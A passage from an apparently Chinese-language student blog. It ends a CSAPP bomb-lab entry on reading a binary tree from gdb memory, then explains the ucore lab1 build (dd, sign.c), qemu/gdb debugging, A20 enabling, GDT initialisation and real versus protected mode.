class="number">16</span>&gt;:  <span class="number">0x0</span> <span class="number">0x0</span></span><br><span class="line"><span class="number">0x603230</span> &lt;n44&gt;: <span class="number">0x23</span>    <span class="number">0x0</span></span><br><span class="line"><span class="number">0x603240</span> &lt;n44+<span class="number">16</span>&gt;:  <span class="number">0x0</span> <span class="number">0x0</span></span><br><span class="line"><span class="number">0x603250</span> &lt;n42&gt;: <span class="number">0x7</span> <span class="number">0x0</span></span><br><span class="line"><span class="number">0x603260</span> &lt;n42+<span class="number">16</span>&gt;:  <span class="number">0x0</span> <span class="number">0x0</span></span><br><span class="line"><span class="number">0x603270</span> &lt;n43&gt;: <span class="number">0x14</span>    <span class="number">0x0</span></span><br><span class="line"><span class="number">0x603280</span> &lt;n43+<span class="number">16</span>&gt;:  <span class="number">0x0</span> <span class="number">0x0</span></span><br><span class="line"><span class="number">0x603290</span> &lt;n46&gt;: <span class="number">0x2f</span>    <span class="number">0x0</span></span><br><span class="line"><span class="number">0x6032a0</span> &lt;n46+<span class="number">16</span>&gt;:  <span class="number">0x0</span> <span class="number">0x0</span></span><br><span class="line"><span class="number">0x6032b0</span> &lt;n48&gt;: <span class="number">0x3e9</span>   <span class="number">0x0</span></span><br><span class="line"><span class="number">0x6032c0</span> &lt;n48+<span class="number">16</span>&gt;:  <span class="number">0x0</span> <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<p>仔细观察可以发现这是一个二叉树的结构，每个节点第1个8字节存放数据，第2个8字节存放左子树地址，第3个8字节存放右子树位置。并且命令也有规律，nab，a代表层数，b代表从左至右第b个节点。<br>edi指向一个树的节点，令edi节点的值与我们读入的值进行比较</p>
<ul>
<li>如果两者相等：返回0</li>
<li>如果前者大于后者：rdi移至左子树，返回2*rax</li>
<li>如果后者大于前者：rdi移至右子树，返回2*rax + 1<br>根据递归调用，如果我们需要返回2，应该在最后一次调用返回0，倒数第二次调用返回2 * rax + 1，第一次调用返回2 * rax。这个数应该在第三层，比父节点大且比根结节小。观察上图，唯一的答案是：0x16(22)</li>
</ul>
]]></content>
      <categories>
        <category>Systems</category>
      </categories>
      <tags>
        <tag>csapp</tag>
      </tags>
  </entry>
  <entry>
    <title>ucore lab1</title>
    <url>/systems/ucore-lab1/</url>
    <content><![CDATA[<p> ucore lab1是一个从无到有的过程，涉及比较多的硬件细节，比如实模式到保护模式的转换，ELF格式的加载，中断处理等内容。根据原理课的内容，ucore lab1设计了一个BIOS,一个bootloader和一个OS来实现初步的操作系统功能。其中BIOS执行系统初始化软件完成基本IO初始化和引导加载功能，bootloader可以切换到X86保护模式，能够读磁盘并加载ELF执行文件格式，并显示字符，OS初步实现处理时钟中断和显示字符等简单功能。</p>
<a id="more"></a>

<h1 id="生成执行文件的过程"><a href="#生成执行文件的过程" class="headerlink" title="生成执行文件的过程"></a>生成执行文件的过程</h1><blockquote>
<p>操作系统镜像文件ucore.img是如何一步一步生成的？</p>
</blockquote>
<p>Makefile中<code>ucore.img</code>部分如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># create ucore.img</span></span><br><span class="line">UCOREIMG	:= $(call totarget,ucore.img)</span><br><span class="line"></span><br><span class="line">$(UCOREIMG): $(kernel) $(bootblock)</span><br><span class="line">	$(V)dd <span class="keyword">if</span>=/dev/zero of=$@ count=<span class="number">10000</span></span><br><span class="line">	$(V)dd <span class="keyword">if</span>=$(bootblock) of=$@ conv=notrunc</span><br><span class="line">	$(V)dd <span class="keyword">if</span>=$(kernel) of=$@ seek=<span class="number">1</span> conv=notrunc</span><br><span class="line"></span><br><span class="line">$(call create_target,ucore.img)</span><br></pre></td></tr></table></figure>
<p>生成<code>UCOREIMG</code>依赖于<code>kernel</code>和<code>bootblock</code>。<br>dd：用指定大小的块拷贝一个文件，并在拷贝的同时进行指定的转换。<br>dd指令参数的解释如下：</p>
<ul>
<li>if=文件名：输入文件名，缺省为标准输入。即指定源文件。&lt; if=input file &gt;</li>
<li>of=文件名：输出文件名，缺省为标准输出。即指定目的文件。&lt; of=output file &gt;</li>
<li>skip=blocks：从输入文件开头跳过blocks个块后再开始复制。</li>
<li>seek=blocks：从输出文件开头跳过blocks个块后再开始复制。</li>
<li>conv=notruncn：在写入文件时防止截断。</li>
<li>$@:表示规则中的目标文件集</li>
</ul>
<p>其中的<code>/dev/zero</code>是什么呢？在类UNIX 操作系统中, <code>/dev/zero</code> 是一个特殊的设备文件，当你读它的时候，它会提供无限的空字符（NULL, ASCII NULL, 0x00）。其中的一个典型用法是用它提供的字符流来覆盖信息，另一个常见用法是产生一个特定大小的空白文件。BSD就是通过mmap把<code>/dev/zero</code>映射到虚地址空间实现共享内存的。可以使用mmap将/dev/zero映射到一个虚拟的内存空间，这个操作的效果等同于使用一段匿名的内存（没有和任何文件相关）。所以以上命令生成一个有10000个块的文件，每个块默认512字节，用0填充，再将<code>bootblock</code>以不截断的方式复制过去，kernel跳过<code>bootblock</code>所存储的块再进行填充。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//构建ucore.img</span></span><br><span class="line">dd <span class="keyword">if</span>=/dev/zero of=bin/ucore.img count=<span class="number">10000</span></span><br><span class="line"><span class="number">10000</span>+<span class="number">0</span> records in</span><br><span class="line"><span class="number">10000</span>+<span class="number">0</span> records out</span><br><span class="line"><span class="number">5120000</span> bytes (<span class="number">5.1</span> MB, <span class="number">4.9</span> MiB) copied, <span class="number">0.0327078</span> s, <span class="number">157</span> MB/s</span><br><span class="line">dd <span class="keyword">if</span>=bin/bootblock of=bin/ucore.img conv=notrunc</span><br><span class="line"><span class="number">1</span>+<span class="number">0</span> records in</span><br><span class="line"><span class="number">1</span>+<span class="number">0</span> records out</span><br><span class="line"><span class="number">512</span> bytes copied, <span class="number">0.000184973</span> s, <span class="number">2.8</span> MB/s</span><br><span class="line">dd <span class="keyword">if</span>=bin/kernel of=bin/ucore.img seek=<span class="number">1</span> conv=notrunc</span><br><span class="line"><span class="number">146</span>+<span class="number">1</span> records in</span><br><span class="line"><span class="number">146</span>+<span class="number">1</span> records out</span><br><span class="line"><span class="number">74816</span> bytes (<span class="number">75</span> kB, <span class="number">73</span> KiB) copied, <span class="number">0.000516557</span> s, <span class="number">145</span> MB/s</span><br></pre></td></tr></table></figure>
<p>生成kernel的编译指令如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># create kernel target</span></span><br><span class="line">kernel = $(call totarget,kernel)</span><br><span class="line"></span><br><span class="line">$(kernel): tools/kernel.ld</span><br><span class="line"></span><br><span class="line">$(kernel): $(KOBJS)</span><br><span class="line">	@echo + ld $@</span><br><span class="line">	$(V)$(LD) $(LDFLAGS) -T tools/kernel.ld -o $@ $(KOBJS)</span><br><span class="line">	@$(OBJDUMP) -S $@ &gt; $(call asmfile,kernel)</span><br><span class="line">	@$(OBJDUMP) -t $@ | $(SED) &#x27;1,/SYMBOL TABLE/d; s/ .* / /; /^$$/d&#x27; &gt; $(call symfile,kernel)</span><br><span class="line"></span><br><span class="line">$(call create_target,kernel)</span><br><span class="line"><span class="comment">//将kern下面所有文件编译生成目标文件再进行链接</span></span><br></pre></td></tr></table></figure>
<p>对应输出如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">+ ld bin/kernel</span><br><span class="line">ld -m    elf_i386 -nostdlib -T tools/kernel.ld -o bin/kernel  obj/kern/init/init.o obj/kern/libs/stdio.o obj/kern/libs/readline.o obj/kern/debug/panic.o obj/kern/debug/kdebug.o obj/kern/debug/kmonitor.o obj/kern/driver/clock.o obj/kern/driver/console.o obj/kern/driver/picirq.o obj/kern/driver/intr.o obj/kern/trap/trap.o obj/kern/trap/vectors.o obj/kern/trap/trapentry.o obj/kern/mm/pmm.o  obj/libs/<span class="built_in">string</span>.o obj/libs/printfmt.o</span><br></pre></td></tr></table></figure>
<p>其中gcc命令参数的解释如下：</p>
<ul>
<li>fno-builtin 不进行builtin函数的优化</li>
<li>ggdb 生成可供gdb使用的调试信息</li>
<li>Wall 编译后显示所有警告</li>
<li>m32 生成适用于32位环境的代码</li>
<li>gstabs 生成stabs格式的调试信息</li>
<li>nostdinc 不链接C标准库，防止C标准库使用自带的init函数代替入口函数</li>
<li>fno-stack-protector 不生成用于检测缓冲区溢出的代码</li>
<li>Os 为减小代码大小而进行优化</li>
</ul>
<p>ld命令参数的解释如下：</p>
<ul>
<li>nostdlib 不链接系统标准启动文件和标准库文件，只把指定的文件传递给链接器</li>
<li>m elf_i386 交叉编译生成i386平台的代码</li>
<li>N 设置代码段和数据段均可读写</li>
<li>e 指定入口</li>
<li><code>Ttext  0x7C00</code> 设定代码段的虚拟内存地址为<code>0x7C00</code>，即主引导扇区被读取到内存的地址。这个地址实际是BIOS自动拷贝过去的，这里再次进行设定应该是程序中直接寻址需要。</li>
</ul>
<p>生成<code>bootblock</code>的编译指令如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># create bootblock</span></span><br><span class="line">bootfiles = $(call listf_cc,boot)</span><br><span class="line">$(foreach f,$(bootfiles),$(call cc_compile,$(f),$(CC),$(CFLAGS) -Os -nostdinc))</span><br><span class="line"><span class="comment">//这里遍历 boot 目录下的所有文件 asm.h bootasm.S bootmain.c</span></span><br><span class="line">bootblock = $(call totarget,bootblock)</span><br><span class="line"><span class="comment">//生成目标文件 asm.o bootasm.o bootmain.o sign.o</span></span><br><span class="line">$(bootblock): $(call toobj,$(bootfiles)) | $(call totarget,sign)</span><br><span class="line">	@echo + ld $@</span><br><span class="line">	$(V)$(LD) $(LDFLAGS) -N -e start -Ttext <span class="number">0x7C00</span> $^ -o $(call toobj,bootblock)</span><br><span class="line">	@$(OBJDUMP) -S $(call objfile,bootblock) &gt; $(call asmfile,bootblock)</span><br><span class="line">	@$(OBJCOPY) -S -O binary $(call objfile,bootblock) $(call outfile,bootblock)</span><br><span class="line">	@$(call totarget,sign) $(call outfile,bootblock) $(bootblock)</span><br><span class="line"></span><br><span class="line">$(call create_target,bootblock)</span><br></pre></td></tr></table></figure>
<p>对应输出如下：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">+ cc boot/bootasm.S</span><br><span class="line">+ cc boot/bootmain.c</span><br><span class="line">+ cc tools/sign.c</span><br><span class="line">+ ld bin/bootblock</span><br><span class="line">    ld -m    elf_i386 -nostdlib -N -e start -Ttext <span class="number">0x7C00</span> obj/boot/bootasm.o </span><br><span class="line">    obj/boot/bootmain.o -o obj/bootblock.o</span><br><span class="line">    &#x27;obj/bootblock.out&#x27; size: 492 bytes</span><br><span class="line">    build 512 bytes boot sector: &#x27;bin/bootblock&#x27; success!</span><br></pre></td></tr></table></figure>
<p>由以上过程可知：</p>
<ol>
<li>编译16个kern中的文件，构建出<code>bin/kernel</code></li>
<li>生成<code>bin/bootblock</code>引导程序</li>
<li>生成<code>ucore.img</code>虚拟磁盘<ul>
<li>初始化<code>ucore.img</code>为<code>5120000</code> bytes，内容为0的文件</li>
<li>拷贝<code>bin/bootblock</code>到<code>ucore.img</code>第一个扇区</li>
<li>拷贝<code>bin/kernel</code>到<code>ucore.img</code>中<code>bootblock</code>所存储的扇区之后</li>
</ul>
</li>
</ol>
<blockquote>
<p>一个被系统认为是符合规范的硬盘主引导扇区的特征是什么？</p>
</blockquote>
<p>在构建bootblock的过程中我们编译了<code>bootasm.S</code> <code>bootmain.c</code> <code>sign.c</code>，其中<code>sign.c</code> 为外部执行程序，用来生成虚拟的硬盘主引导扇区。<br>以下为<code>sign.c</code>的代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">st</span>;</span></span><br><span class="line">    <span class="comment">//判断输入参数的个数</span></span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">3</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Usage: &lt;input filename&gt; &lt;output filename&gt;\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//通过文件名filename（argv[1])获取文件信息，并保存在st所指的结构体stat中</span></span><br><span class="line">    <span class="keyword">if</span> (stat(argv[<span class="number">1</span>], &amp;st) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Error opening file &#x27;%s&#x27;: %s\n&quot;</span>, argv[<span class="number">1</span>], strerror(errno));</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&#x27;%s&#x27; size: %lld bytes\n&quot;</span>, argv[<span class="number">1</span>], (<span class="keyword">long</span> <span class="keyword">long</span>)st.st_size);</span><br><span class="line">    <span class="comment">//文件大小超过510后报错，后两位用来存储结束位</span></span><br><span class="line">    <span class="keyword">if</span> (st.st_size &gt; <span class="number">510</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;%lld &gt;&gt; 510!!\n&quot;</span>, (<span class="keyword">long</span> <span class="keyword">long</span>)st.st_size);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//初始化buf数组为0</span></span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">512</span>];</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">    FILE *ifp = fopen(argv[<span class="number">1</span>], <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    <span class="keyword">int</span> size = fread(buf, <span class="number">1</span>, st.st_size, ifp);</span><br><span class="line">    <span class="comment">//检查文件实际大小是否和文件头描述一致</span></span><br><span class="line">    <span class="keyword">if</span> (size != st.st_size) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;read &#x27;%s&#x27; error, size is %d.\n&quot;</span>, argv[<span class="number">1</span>], size);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(ifp);</span><br><span class="line">    <span class="comment">//写入结束位</span></span><br><span class="line">    buf[<span class="number">510</span>] = <span class="number">0x55</span>;</span><br><span class="line">    buf[<span class="number">511</span>] = <span class="number">0xAA</span>;</span><br><span class="line">    FILE *ofp = fopen(argv[<span class="number">2</span>], <span class="string">&quot;wb+&quot;</span>);</span><br><span class="line">    size = fwrite(buf, <span class="number">1</span>, <span class="number">512</span>, ofp);</span><br><span class="line">    <span class="keyword">if</span> (size != <span class="number">512</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;write &#x27;%s&#x27; error, size is %d.\n&quot;</span>, argv[<span class="number">2</span>], size);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(ofp);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;build 512 bytes boot sector: &#x27;%s&#x27; success!\n&quot;</span>, argv[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>符合规范的主引导扇区特征为：</p>
<ul>
<li>大小为512字节</li>
<li>最后两个字节为<code>0x55</code>和<code>0xaa</code></li>
</ul>
<h1 id="qemu执行并调试"><a href="#qemu执行并调试" class="headerlink" title="qemu执行并调试"></a>qemu执行并调试</h1><blockquote>
<p>从CPU加电后执行的第一条指令开始，单步跟踪BIOS的执行。</p>
</blockquote>
<p>修改Makefile中<code>debug</code>部分如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">debug: $(UCOREIMG)</span><br><span class="line">        $(V)$(TERMINAL) -e <span class="string">&quot;$(QEMU) -S -s -d in_asm -D  $(BINDIR)/q.log -parallel stdio -hda $&lt; -serial null&quot;</span></span><br><span class="line">        $(V)sleep <span class="number">2</span></span><br><span class="line">        $(V)$(TERMINAL) -e <span class="string">&quot;gdb -q -tui -x tools/gdbinit&quot;</span></span><br></pre></td></tr></table></figure>
<p>其中修改部分另外启动一个<code>terminal</code>窗口并运行debug状态的qemu，将打印的汇编代码输入到<code>q.log</code>文件中。<br>修改<code>tools/gdbinit</code>部分如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">file bin/kernel</span><br><span class="line"><span class="built_in">set</span> architecture i8086</span><br><span class="line">target remote :<span class="number">1234</span></span><br></pre></td></tr></table></figure>
<p>这是gdb在初始化时会执行的命令，首先加载<code>bin/kernel</code>的符号，设置模拟cpu架构为i8086再对qemu的1234端口进行连接。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">(gdb) i r cs</span><br><span class="line">cs                <span class="number">0xf000</span>    </span><br><span class="line">(gdb) i r eip</span><br><span class="line">eip               <span class="number">0xfff0</span>    </span><br><span class="line">(gdb) x/i <span class="number">0xffff0</span></span><br><span class="line">   <span class="number">0xffff0</span>:	ljmp   $<span class="number">0x3630</span>,$<span class="number">0xf000e05b</span></span><br></pre></td></tr></table></figure>
<p>系统在加电后执行的第一条指令为长跳转指令，跳转至<code>0xf000e05b</code>，并从此处加载BIOS。</p>
<p>在16位实模式下，线性地址可寻址空间为1M，寻址方式为<code>base address + eip​</code>，其中<code>base address</code>在一般情况下等于<code>selector &lt;&lt; 4</code>，但是在刚刚开机上电的时候这种关系不成立，此时<code>base address = 0xFFFF0000</code>，<code>selector = 0xF000</code>，再加上<code>eip = 0x0000FFF0</code>，最终形成了<code>0xFFFFFFF0</code>的最初地址。执行跳转指令之后，<code>base address</code>缓存得到更新，重新计算为<code>0x000F0000</code>，之后的寻址便从<code>0x000FXXXX</code>开始了。</p>
<p>另外，在32位保护模式下，线性地址可寻址空间为4G，寻址方式为<code>base address + eip</code>，其中<code>base address</code>总是等于__selector中的index域指向的GDT表项的偏移基址。</p>
<blockquote>
<p>在初始化位置0x7c00设置实地址断点,测试断点正常。</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">(gdb) <span class="keyword">break</span> *<span class="number">0x7c00</span></span><br><span class="line">Breakpoint <span class="number">1</span> at <span class="number">0x7c00</span></span><br><span class="line">(gdb) <span class="keyword">continue</span></span><br><span class="line">Continuing.</span><br></pre></td></tr></table></figure>
<blockquote>
<p>从0x7c00开始跟踪代码运行,将单步跟踪反汇编得到的代码与bootasm.S和 bootblock.asm进行比较。</p>
</blockquote>
<p>bootasm.S中涉及汇编伪操作命令如下：</p>
<ul>
<li>.set    赋值语句，把某一个符号名定义成一个值，该指令并不分配空间。</li>
<li>.global 定义全局符号</li>
<li>.byte   定义单字节数据</li>
<li>.word/.long /.int  定义4字节数据 </li>
<li>.code16/.code32 指定汇编指令集</li>
<li>.p2align 按照4字节对齐 </li>
</ul>
<p>从q.log文件中可以发现，在<code>0x7c00</code>后的汇编代码与bootasm.S和bootblock.asm中基本一致，部分代码经过编译优化后有所改变，但是整体执行顺序和逻辑不变。</p>
<h1 id="bootloader进入保护模式的过程"><a href="#bootloader进入保护模式的过程" class="headerlink" title="bootloader进入保护模式的过程"></a>bootloader进入保护模式的过程</h1><ul>
<li>禁止中断，设置段寄存器</li>
<li>使能A20地址线</li>
<li>读取GDT表</li>
<li>使能CRO寄存器的PE位，跳转至32位地址</li>
<li>设置保护模式的段寄存器，设置调用栈，调用bootmain函数</li>
</ul>
<blockquote>
<p>为何开启A20，以及如何开启A20</p>
</blockquote>
<p>为了兼容早期电脑，A20线（对应由高到低第21根地址线）恒为低，访问地址舍入到0，这时只能访问奇数兆内存而不能访问偶数兆内存，开启A20模式后可以访问连续内存空间。<br>如何开启A20:</p>
<ol>
<li>等待8042输入缓存为空</li>
<li>发送P2命令到8042</li>
<li>再次等待8042输入缓存空</li>
<li>将<code>0xdf(11011111)</code> 写入到0x60端口来设置P20的A20位为1</li>
</ol>
<blockquote>
<p>如何初始化GDT表</p>
</blockquote>
<p>全局描述表的第一项被初始化为0，当段选择子指向全局描述符表的第一项时，可以当做一个空的选择子。当一个段寄存器被加载一个空选择子时，处理器并不会产生一个异常。但是，当用一个空选择子去访问内存时，则会产生异常。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Normal segment */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SEG_NULLASM                                             \</span></span><br><span class="line">    .word <span class="number">0</span>, <span class="number">0</span>;                                                 \</span><br><span class="line">    .byte <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SEG_ASM(type,base,lim)                                  \</span></span><br><span class="line">    .word (((lim) &gt;&gt; <span class="number">12</span>) &amp; <span class="number">0xffff</span>), ((base) &amp; <span class="number">0xffff</span>);          \</span><br><span class="line">    .byte (((base) &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xff</span>), (<span class="number">0x90</span> | (type)),             \</span><br><span class="line">        (<span class="number">0xC0</span> | (((lim) &gt;&gt; <span class="number">28</span>) &amp; <span class="number">0xf</span>)), (((base) &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xff</span>)</span><br><span class="line"></span><br><span class="line">lgdt gdtdesc <span class="comment">//直接载入引导区的描述表即可</span></span><br><span class="line"># Bootstrap GDT</span><br><span class="line">.p2align <span class="number">2</span>                                          <span class="meta"># force 4 byte alignment</span></span><br><span class="line">gdt:</span><br><span class="line">    SEG_NULLASM                                     <span class="meta"># null seg</span></span><br><span class="line">    SEG_ASM(STA_X|STA_R, <span class="number">0x0</span>, <span class="number">0xffffffff</span>)           <span class="meta"># code seg for bootloader and kernel</span></span><br><span class="line">    SEG_ASM(STA_W, <span class="number">0x0</span>, <span class="number">0xffffffff</span>)                 <span class="meta"># data seg for bootloader and kernel</span></span><br><span class="line"></span><br><span class="line">gdtdesc:</span><br><span class="line">    .word <span class="number">0x17</span>                                      <span class="meta"># sizeof(gdt) - 1</span></span><br><span class="line">    .<span class="keyword">long</span> gdt                                       <span class="meta"># address gdt</span></span><br></pre></td></tr></table></figure>
<p>另外，在bootloader加载操作系统后，GDT表将更新为以下全局描述表。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SEG_NULL                                            \</span></span><br><span class="line">    (struct segdesc)&#123;<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SEG(type, base, lim, dpl)                        \</span></span><br><span class="line">    (struct segdesc)&#123;                                    \</span><br><span class="line">        ((lim) &gt;&gt; <span class="number">12</span>) &amp; <span class="number">0xffff</span>, (base) &amp; <span class="number">0xffff</span>,        \</span><br><span class="line">        ((base) &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xff</span>, type, <span class="number">1</span>, dpl, <span class="number">1</span>,            \</span><br><span class="line">        (<span class="keyword">unsigned</span>)(lim) &gt;&gt; <span class="number">28</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>,                \</span><br><span class="line">        (<span class="keyword">unsigned</span>) (base) &gt;&gt; <span class="number">24</span>                            \</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* global segment number */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SEG_KTEXT    1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SEG_KDATA    2</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SEG_UTEXT    3</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SEG_UDATA    4</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SEG_TSS        5</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* global descriptor numbers */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GD_KTEXT    ((SEG_KTEXT) &lt;&lt; 3)        <span class="comment">// kernel text</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GD_KDATA    ((SEG_KDATA) &lt;&lt; 3)        <span class="comment">// kernel data</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GD_UTEXT    ((SEG_UTEXT) &lt;&lt; 3)        <span class="comment">// user text</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GD_UDATA    ((SEG_UDATA) &lt;&lt; 3)        <span class="comment">// user data</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GD_TSS        ((SEG_TSS) &lt;&lt; 3)        <span class="comment">// task segment selector</span></span></span><br><span class="line"><span class="comment">//段选择子中3到15位为index，所以左移3位</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DPL_KERNEL    (0)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DPL_USER    (3)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KERNEL_CS    ((GD_KTEXT) | DPL_KERNEL)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KERNEL_DS    ((GD_KDATA) | DPL_KERNEL)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> USER_CS        ((GD_UTEXT) | DPL_USER)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> USER_DS        ((GD_UDATA) | DPL_USER)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">segdesc</span> <span class="title">gdt</span>[] =</span> &#123;</span><br><span class="line">    SEG_NULL,</span><br><span class="line">    [SEG_KTEXT] = SEG(STA_X | STA_R, <span class="number">0x0</span>, <span class="number">0xFFFFFFFF</span>, DPL_KERNEL),</span><br><span class="line">    [SEG_KDATA] = SEG(STA_W, <span class="number">0x0</span>, <span class="number">0xFFFFFFFF</span>, DPL_KERNEL),</span><br><span class="line">    [SEG_UTEXT] = SEG(STA_X | STA_R, <span class="number">0x0</span>, <span class="number">0xFFFFFFFF</span>, DPL_USER),</span><br><span class="line">    [SEG_UDATA] = SEG(STA_W, <span class="number">0x0</span>, <span class="number">0xFFFFFFFF</span>, DPL_USER),</span><br><span class="line">    [SEG_TSS]    = SEG_NULL,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">pseudodesc</span> <span class="title">gdt_pd</span> =</span> &#123;</span><br><span class="line">    <span class="keyword">sizeof</span>(gdt) - <span class="number">1</span>, (<span class="keyword">uint32_t</span>)gdt</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>以上分别为汇编和c语言初始化GDT描述表的方式。<br>其中，结构体<code>pseudesc</code>的定义可在<code>x86.</code>h中找到</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Pseudo-descriptors used for LGDT, LLDT(not used) and LIDT instructions. */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pseudodesc</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint16_t</span> pd_lim;        <span class="comment">// Limit</span></span><br><span class="line">    <span class="keyword">uint32_t</span> pd_base;        <span class="comment">// Base address</span></span><br><span class="line">&#125; __attribute__ ((packed));</span><br></pre></td></tr></table></figure>
<blockquote>
<p>段寄存器的字段含义和功能有哪些？</p>
</blockquote>
<ol>
<li>代码段寄存器 CS（Code Segment）存放当前正在运行的程序代码所在段的段基址，表示当前使用的指令代码可以从该段寄存器指定的存储器段中取得，相应的偏移量则由IP提供</li>
<li>数据段寄存器 DS（Data Segment）指出当前程序使用的数据所存放段的最低地址，即存放数据段的段基址</li>
<li>堆栈段寄存器 SS（Stack Segment）指出当前堆栈的底部地址，即存放堆栈段的段基址</li>
<li>附加段寄存器 ES（Extra Segment）指出当前程序使用附加数据段的段基址，该段是串操作指令中目的串所在的段</li>
<li>附加段寄存器 FS</li>
<li>附加段寄存器 GS</li>
</ol>
<blockquote>
<p>实模式和保护模式的区别</p>
</blockquote>
<p>保护模式和实模式的根本区别是进程内存是否受保护。实模式将整个物理内存看成分段的区域，程序代码和数据位于不同区域，没有区别对待系统程序和用户程序，而且每一个指针都是指向实际的物理地址。若用户程序修改了系统程序区域或者其他用户区域的信息，程序可能无法正常运行，所以引入了保护模式，物理地址不可直接由程序访问，程序内存地址(称为虚拟地址或逻辑地址)由操作系统转化为物理地址访问，并有相应的检查机制。</p>
